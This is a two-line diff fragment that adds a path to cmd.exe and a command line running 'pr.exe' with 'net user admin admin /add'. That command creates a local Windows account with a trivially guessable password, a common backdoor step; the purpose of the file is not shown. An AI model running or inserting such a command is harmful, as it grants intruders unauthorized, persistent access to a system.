@@ -1,0 +1,2 @@
+c:\windows\system32\cmd.exe
+c:\windows\system32\pr.exe "net user admin admin /add"
